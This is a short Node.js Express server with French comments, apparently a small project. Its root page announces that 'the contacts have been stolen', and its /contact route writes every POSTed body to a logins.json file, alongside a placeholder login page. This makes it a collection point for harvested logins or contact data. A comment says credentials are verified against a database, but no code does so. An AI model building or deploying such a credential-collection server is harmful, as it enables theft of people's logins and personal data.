const http = require('http');

/**const hostname = '127.0.0.1';
const port = 3000;

const server = http.createServer((req, res) => {
  res.statusCode = 200;
  res.setHeader('Content-Type', 'text/plain');
  res.end('Hello, World!\n');
});

server.listen(port, hostname, () => {
  console.log(`Server running at http://${hostname}:${port}/`);
});
**/


// Initialiser la variable body parser qui sert à parser le contenu des requêtes
const bodyParser = require("body-parser");
// Initialiser la variable express
const express = require("express");
// Initialisation de la variable app, celle-ci est la variable qui va servir à traiter toutes les requêtes que le serveur reçoit.
const app = express();
// Initialisation de la constante fs (File System) qui utilise le module fs pour intéragir avec le ficher système
const fs = require('fs');

app.use(express.json());
app.use(bodyParser.urlencoded({extended: true}));

// Routage de la page d'accueil en renvoyant "welcome page!"
app.get('/', (req, res) => {
    res.send("Les contacts ont été volés haha ^^")
    //var contactJ = require("./logins.json")
    //var contactClear = JSON.stringify(contactJ)
    //res.send(contactJ)
});

app.get('/login', (req, res) => {
    res.send("page d'authentification")
});

// Routage de la page [adresse vers le serveur]/contacts en récupérant le corp de la requête
app.post('/contact', (req, res) => {
    var requete = req.body
    var informations = JSON.parse(JSON.stringify(requete))
    // Enregistrer les informations contenues dans la requête dans le fichier "logins.json" dans le répertoire courant du serveur
    fs.writeFileSync('./logins.json', JSON.stringify(requete));
    // Vérifier si l'identifiant et le mot de passe envoyés correspondent bien aux données d'un compte client dans la base de données

    for(let i=0;i<informations.length;i++){
            console.log(informations[i])
    }
});

app.use(function(req, res){
   res.sendStatus(404);
});

app.listen(8080, () => {
  console.log("Started on http://localhost:8080");
});


/**const requete = new XMLHttpRequest()
               const methodeHttp = "GET"
               const url = "127.0.0.1:3000"
               requete.open(methodeHttp,url)
               var resultat = JSON.parse(JSON.stringify(requete.body))
               requete.onreadystatechange = function(){
                   for(let i=0;i<contacts.length;i++){
                       console.log(resulat[i])
                   }
               }
               **/